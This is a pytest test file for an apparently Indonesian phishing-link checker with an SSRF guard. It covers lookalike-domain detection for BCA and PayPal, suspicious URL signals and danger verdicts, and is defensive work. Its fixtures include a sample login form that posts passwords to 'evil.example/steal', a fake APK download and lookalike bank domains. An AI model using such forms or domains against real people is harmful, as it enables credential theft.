import http.server
import threading

import pytest

import checker as c
import ssrf_guard as g


def test_registered_domain():
    assert c.registered_domain("login.bca-co-id.xyz") == "bca-co-id.xyz"
    assert c.registered_domain("www.bca.co.id") == "bca.co.id"
    assert c.registered_domain("a.b.example.com") == "example.com"


def test_brand_impersonation_detects_fakes():
    assert c.brand_impersonation("bca-co-id.xyz", "")["brand"] == "bca"
    assert c.brand_impersonation("secure-paypal.com.verify.ru", "")["brand"] == "paypal"
    assert c.brand_impersonation("paypa1.com", "")["brand"] == "paypal"  # angka 1 -> l


def test_official_domains_are_not_flagged():
    assert c.brand_impersonation("www.bca.co.id", "") is None
    assert c.brand_impersonation("klikbca.com", "") is None
    assert c.brand_impersonation("www.paypal.com", "") is None
    assert c.brand_impersonation("example.com", "") is None


def test_url_only_signals():
    out = c.analyze("http://192.168.0.1@evil.example/login")
    codes = {s["code"] for s in out["signals"]}
    assert "at-symbol" in codes
    out2 = c.analyze("https://example.com/app.apk")
    assert any(s["code"] == "download-ext" for s in out2["signals"])


class _H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == "/apk":
            body = b"PK\x03\x04" + b"\x00" * 32
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.android.package-archive")
            self.send_header("Content-Disposition", 'attachment; filename="undangan.apk"')
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if self.path == "/login":
            body = ('<html><body><form action="https://evil.example/steal" method="post">'
                    '<input type="password" name="pw"></form>Masukkan kata sandi dan OTP Anda</body></html>').encode()
        else:
            body = b"<html><body>Halaman biasa tanpa form.</body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


@pytest.fixture
def server(monkeypatch):
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    real = g.is_public_ip
    monkeypatch.setattr(g, "is_public_ip", lambda ip: ip == "127.0.0.1" or real(ip))
    monkeypatch.setattr(g, "ALLOWED_PORTS", (None, 80, 443, port))
    monkeypatch.setattr(c, "domain_age_days", lambda host: None)  # jangan panggil RDAP saat uji
    yield f"http://127.0.0.1:{port}"
    srv.shutdown()


def test_apk_download_is_danger(server):
    out = c.analyze(server + "/apk")
    assert any(s["code"] == "download" for s in out["signals"])
    assert c.verdict(out)["level"] == "danger"


def test_credential_form_cross_domain_is_danger(server):
    out = c.analyze(server + "/login")
    cred = [s for s in out["signals"] if s["code"] == "credential-form"]
    assert cred and cred[0]["cross_domain_post"] == ["evil.example"]
    assert c.verdict(out)["level"] == "danger"


def test_plain_page_has_no_scary_signals(server):
    out = c.analyze(server + "/plain")
    assert c.verdict(out)["level"] in ("clear", "warn")  # mungkin 'warn' kal612 karena http lokal
    assert not any(s["level"] == "danger" for s in out["signals"])


def test_blocked_internal_target():
    # Alamat internal harus gagal diperiksa dan TIDAK PERNAH dinilai aman (clear).
    out = c.analyze("http://127.0.0.1:1/")
    assert out["error"]
    assert c.verdict(out)["level"] in ("unknown", "warn")  # IP mentah wajar ditandai mencurigakan
    assert c.verdict(out)["level"] != "clear"


def test_dead_impersonation_still_dangerous(monkeypatch):
    # Domain peniru bank yang sudah mati: koneksi gagal, tapi tetap Bahaya dari sinyal URL.
    monkeypatch.setattr(c, "follow", lambda u: (None, [], "ConnectionError"))
    out = c.analyze("http://bca-co-id.xyz/login")
    assert out["error"]
    codes = {s["code"] for s in out["signals"]}
    assert "brand-impersonation" in codes
    assert c.verdict(out)["level"] == "danger"


def test_no_duplicate_download(monkeypatch):
    monkeypatch.setattr(c, "domain_age_days", lambda h: None)
    out = c.analyze("https://example.com/app.apk")
    # hanya satu sinyal unduhan, bukan dua
    dl = [s for s in out["signals"] if s["code"] in ("download", "download-ext")]
    assert len(dl) <= 1 or {s["code"] for s in dl} == {"download-ext"}
